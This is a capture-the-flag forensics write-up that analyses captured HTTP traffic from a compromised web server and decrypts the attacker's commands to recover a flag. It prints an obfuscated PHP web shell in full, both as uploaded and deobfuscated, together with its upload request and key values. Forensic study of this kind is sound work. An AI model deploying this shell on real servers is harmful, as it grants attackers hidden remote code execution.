
Our web server was compromised again and we aren't really sure what the attacker was doing. Luckily, we only use HTTP and managed to capture network traffic during the attack! Can you figure out what the attacker was up to?

```python
from scapy.all import rdpcap, TCP, Raw

# Read packets from the PCAP file
packets = rdpcap("web_shell.pcap")

# Filter packets that are using TCP port 80 (HTTP)
http_packets = []
for pkt in packets:
    if pkt.haslayer(TCP):
        # Check if either source or destination port is 80 (HTTP)
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        if sport == 80 or dport == 80:
            if pkt.haslayer(Raw):  # Ensure there is payload data
                http_packets.append(pkt)

# Group packets by a simple flow key (source IP, source port, destination IP, destination port)
flows = {}
for pkt in http_packets:
    # Use IP layer for addresses; note that for IPv6, additional handling is needed.
    if pkt.haslayer("IP"):
        ip_layer = pkt.getlayer("IP")
        tcp_layer = pkt.getlayer("TCP")
        flow_key = (ip_layer.src, tcp_layer.sport, ip_layer.dst, tcp_layer.dport)
        flows.setdefault(flow_key, []).append(pkt)

# Prepare output by reassembling payloads for each flow
output = ""
for flow, pkts in flows.items():
    # Sort packets by timestamp for a basic reassembly order
    pkts.sort(key=lambda x: x.time)
    output += f"Flow: {flow}\n"
    data = b""
    for pkt in pkts:
        if pkt.haslayer(Raw):
            data += pkt[Raw].load
    try:
        # Decode data as UTF-8; non-decodable bytes will be replaced.
        output += data.decode('utf-8', errors='replace')
    except Exception:
        output += "<Non-UTF8 Data>\n"
    output += "\n" + ("-" * 50) + "\n"

```

tcp.stream eq 159

```
POST /uploader.php HTTP/1.1
Host: 192.168.10.184
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 961
Content-Type: multipart/form-data; boundary=------------------------4f3ee3418e909233

--------------------------4f3ee3418e909233
Content-Disposition: form-data; name="uploaded_file"; filename="owned.php"
Content-Type: application/octet-stream

<?php
$d=str_replace('eq','','eqcreaeqteeq_fueqnceqtieqon');
$C='{[Z$o.=$t[Z{$i}^$k{$j};[Z}}return [Z$[Zo;}if (@preg_[Zmatc[Zh("[Z/$[Zkh(.+)$kf[Z/",@file[Z_ge[Z[Zt_conten[Zts("p[Z[Zh';
$q='Z[Z,$k){$c=strlen($k);$l=s[Ztrlen([Z$t);$[Z[Zo="";for[Z($i=0;$i<$[Zl;){for[Z($j=0[Z;($j<[Z[Z$c&&$i<$l[Z[Z);$j[Z++,$i++)';
$O='$k="8[Z1aeb[Ze1[Z8";$kh="775d[Z4[Zf83f4e0";[Z$kf=[Z"0120dd0bcc[Zc6[Z";$p="[ZkkqES1eCI[ZzoxyHXb[Z[Z";functio[Zn x[Z($t[';
$Z='[Zet_conte[Znts()[Z;@ob_end_clean();$r=[Z@b[Zase64_enco[Zde(@x([Z@gzco[Z[Z[Zmpress($o),$k));pri[Znt[Z("$[Zp$kh$r$kf");}';
$V='p://input"),$m)[Z==1) {@ob_[Zst[Zart();@e[Zval(@gzun[Zcom[Zpress(@x[Z(@base[Z64_de[Zc[Zode($m[1])[Z,$k)));$[Zo[Z=@ob_[Zg';
$v=str_replace('[Z','',$O.$q.$C.$V.$Z);
$W=$d('',$v);$W();
?>

--------------------------4f3ee3418e909233--

HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 01:50:24 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 353
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="uploader.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
The file owned.php has been uploaded
```

https://www.unphp.net/decode/5aa1b33f71612c644e586fe1517e723b/

```
function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$k="81aebe18";$kh="775d4f83f4e0";$kf="0120dd0bccc6";$p="kkqES1eCIzoxyHXb";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {@ob_start();eval(@gzuncompress(@x(base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}
```

from tcp.stream eq 160 to 284 have the data uploaded

```
--------------------------------------------------
Flow: ('192.168.10.184', 57478, '192.168.10.184', 80)
POST /uploads/owned.php HTTP/1.1
Accept-Encoding: identity
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Host: 192.168.10.184
User-Agent: Opera/9.51 (Windows NT 5.1; U; en-GB)
Connection: close

q?zI*>+6b""Sb|Yu775d4f83f4e0QK0qKKyt5giKAVRXstE3OC/tYkg0120dd0bccc6j<Z}jD-*i.}!w3K
--------------------------------------------------
Flow: ('192.168.10.184', 80, '192.168.10.184', 57478)
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 01:50:29 GMT
Server: Apache
Content-Length: 60
Connection: close
Content-Type: text/html; charset=UTF-8

kkqES1eCIzoxyHXb775d4f83f4e0QK1S11JQAzg4MnNkYA==0120dd0bccc6
--------------------------------------------------
Flow: ('192.168.10.184', 57480, '192.168.10.184', 80)
POST /uploads/owned.php HTTP/1.1
Accept-Encoding: identity
Content-Type: application/x-www-form-urlencoded
Content-Length: 162
Host: 192.168.10.184
User-Agent: Opera/9.51 (Windows NT 5.1; U; en-GB)
Connection: close

q?zI*>+6b""Sb|Yu775d4f83f4e0QK0qqyqsHepo5k4uTrceFxfmrk2rqOAXFfmoKi5MZ++MRylISK8eshd7TK1NT/j0c+ZRZehwZi6vlYcPysIXX9waOX95fik6bTNhrjh96A0120dd0bccc6j<Z}jD-*i.}!w3K
--------------------------------------------------
Flow: ('192.168.10.184', 80, '192.168.10.184', 57480)
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 01:50:29 GMT
Server: Apache
Content-Length: 60
Connection: close
Content-Type: text/html; charset=UTF-8

kkqES1eCIzoxyHXb775d4f83f4e0QK3SUVRTAdw6MWVGY24=0120dd0bccc6
--------------------------------------------------
Flow: ('192.168.10.184', 57482, '192.168.10.184', 80)
POST /uploads/owned.php HTTP/1.1
Accept-Encoding: identity
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Host: 192.168.10.184
User-Agent: Opera/9.51 (Windows NT 5.1; U; en-GB)
Connection: close

q?zI*>+6b""Sb|Yu775d4f83f4e0QK0qqyqsHepo5k4uTrceFxfmrk2rqOAXFfmoKi5MZ++MRylISK8eshd7TK1NT/j0c+ZRZehwZi6vlYcPygKXECDoyHxg8DA4Reh2qw0120dd0bccc6j<Z}jD-*i.}!w3K
--------------------------------------------------
Flow: ('192.168.10.184', 80, '192.168.10.184', 57482)
HTTP/1.1 200 OK
Date: Tue, 06 Apr 2021 01:50:29 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 88
Connection: close
Content-Type: text/html; charset=UTF-8

kkqES1eCIzoxyHXb775d4f83f4e0QK1KqC7UBA7uGU5KtSh4FHHlNS2ldRnyFxxJI3OGMzjUmXCk0120dd0bccc6
```



```
from scapy.all import rdpcap, TCP, Raw, IP
import base64
import zlib

# Read packets from the PCAP file
packets = rdpcap("web_shell.pcap")

# Filter HTTP packets (port 80)
http_packets = []
for pkt in packets:
    if pkt.haslayer(TCP):
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        if sport == 80 or dport == 80:
            if pkt.haslayer(Raw):
                http_packets.append(pkt)

# Group packets by flow
flows = {}
for pkt in http_packets:
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip = pkt[IP]
        tcp = pkt[TCP]
        flow_key = (ip.src, tcp.sport, ip.dst, tcp.dport)
        flows.setdefault(flow_key, []).append(pkt)

def decrypt_and_decompress(encrypted_b64):
    # Add padding if necessary
    missing_padding = len(encrypted_b64) % 4
    if missing_padding:
        encrypted_b64 += b'=' * (4 - missing_padding)
    try:
        encrypted = base64.b64decode(encrypted_b64, validate=True)
    except:
        return None
    key = b'81aebe18'
    decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
    try:
        decompressed = zlib.decompress(decrypted)
        return decompressed.decode('utf-8', errors='replace')
    except zlib.error:
        return None

# Process each flow
for flow, pkts in flows.items():
    pkts.sort(key=lambda x: x.time)
    data = b""
    for pkt in pkts:
        if pkt.haslayer(Raw):
            data += pkt[Raw].load
    kh_marker = b'775d4f83f4e0'
    kf_marker = b'0120dd0bccc6'
    start_idx = data.find(kh_marker)
    if start_idx == -1:
        continue
    start_idx += len(kh_marker)
    end_idx = data.find(kf_marker, start_idx)
    if end_idx == -1:
        continue
    encrypted_b64 = data[start_idx:end_idx]
    # Decrypt and decompress
    result = decrypt_and_decompress(encrypted_b64)
    if result:
        print(f"Flow {flow} decrypted:")
        print(result)
        print("-" * 50)
```

python poc web_shell.pcap

```
xxd -p -l1 -s31 ../y_flag_here.txt 2>&1
32
xxd -p -l1 -s34 ../y_flag_here.txt 2>&1
37
xxd -p -l1 -s26 ../y_flag_here.txt 2>&1
33
xxd -p -l1 -s17 ../y_flag_here.txt 2>&1
63
xxd -p -l1 -s10 ../y_flag_here.txt 2>&1
38
xxd -p -l1 -s20 ../y_flag_here.txt 2>&1
30
xxd -p -l1 -s7 ../y_flag_here.txt 2>&1
35
xxd -p -l1 -s33 ../y_flag_here.txt 2>&1'
39
xxd -p -l1 -s36 ../y_flag_here.txt 2>&1
34
xxd -p -l1 -s25 ../y_flag_here.txt 2>&1
62
xxd -p -l1 -s37 ../y_flag_here.txt 2>&1
38
xxd -p -l1 -s6 ../y_flag_here.txt 2>&
7b
xxd -p -l1 -s23 ../y_flag_here.txt 2>&1
39
xxd -p -l1 -s28 ../y_flag_here.txt 2>&1
32
xxd -p -l1 -s38 ../y_flag_here.txt 2>&1
63
xxd -p -l1 -s11 ../y_flag_here.txt 2>&1
35
xxd -p -l1 -s39 ../y_flag_here.txt 2>&1
7d
xxd -p -l1 -s2 ../y_flag_here.txt 2>&1
37
xxd -p -l1 -s32 ../y_flag_here.txt 2>&1
66
xxd -p -l1 -s9 ../y_flag_here.txt 2>&1
34
xxd -p -l1 -s27 ../y_flag_here.txt 2>&1
30
xxd -p -l1 -s22 ../y_flag_here.txt 2>&1
66
xxd -p -l1 -s30 ../y_flag_here.txt 2>&1
61
xxd -p -l1 -s1 ../y_flag_here.txt 2>&1
34
xxd -p -l1 -s29 ../y_flag_here.txt 2>&1
32
xxd -p -l1 -s35 ../y_flag_here.txt 2>&1
32
xxd -p -l1 -s19 ../y_flag_here.txt 2>&1
64
xxd -p -l1 -s3 ../y_flag_here.txt 2>&1
43
xxd -p -l1 -s16 ../y_flag_here.txt 2>&1
61
xxd -p -l1 -s14 ../y_flag_here.txt 2>&1
30
xxd -p -l1 -s8 ../y_flag_here.txt 2>&1
36
xxd -p -l1 -s4 ../y_flag_here.txt 2>&1
54
xxd -p -l1 -s21 ../y_flag_here.txt 2>&1
62
xxd -p -l1 -s24 ../y_flag_here.txt 2>&1
37
xxd -p -l1 -s5 ../y_flag_here.txt 2>&1
46
xxd -p -l1 -s18 ../y_flag_here.txt 2>&1
33
xxd -p -l1 -s15 ../y_flag_here.txt 2>&1
37
xxd -p -l1 -s12 ../y_flag_here.txt 2>&1
63
xxd -p -l1 -s13 ../y_flag_here.txt 2>&1
63
xxd -p -l1 -s0 ../y_flag_here.txt 2>&1
32
```

```python
# Extracted hex values and their corresponding offsets
hex_data = {
    31: "32", 34: "37", 26: "33", 17: "63", 10: "38", 20: "30", 7: "35", 
    33: "39", 36: "34", 25: "62", 37: "38", 6: "7b", 23: "39", 28: "32", 
    38: "63", 11: "35", 39: "7d", 2: "37", 32: "66", 9: "34", 27: "30", 
    22: "66", 30: "61", 1: "34", 29: "32", 35: "32", 19: "64", 3: "43", 
    16: "61", 14: "30", 8: "36", 4: "54", 21: "62", 24: "37", 5: "46", 
    18: "33", 15: "37", 12: "63", 13: "63", 0: "32"
}

# Sort by offset and convert hex values to ASCII characters
sorted_bytes = [hex_data[i] for i in sorted(hex_data.keys())]
flag = "".join([bytes.fromhex(b).decode("utf-8") for b in sorted_bytes])

flag
```

`247CTF{******}`
